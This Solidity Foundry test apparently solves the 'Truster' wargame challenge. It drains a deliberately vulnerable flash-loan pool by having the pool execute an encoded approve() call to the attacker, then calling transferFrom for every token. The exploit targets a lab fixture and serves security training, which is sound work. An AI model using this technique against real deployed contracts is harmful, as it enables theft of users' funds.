// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/src-default/attacker-contracts/AttackTruster.sol";

import "./utils/TrusterFixture.sol";

contract TrusterTest is TrusterFixture {
    AttackFree public attackContract;

    function setUp() public override {
        super.setUp();
    }

    function test_truster() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        attackContract = new AttackFree(address(pool), address(token));

        bytes memory data_ = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);

        attackContract.attack(0, attacker, address(token), data_);

        token.transferFrom(address(pool), attacker, TOKENS_IN_POOL);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
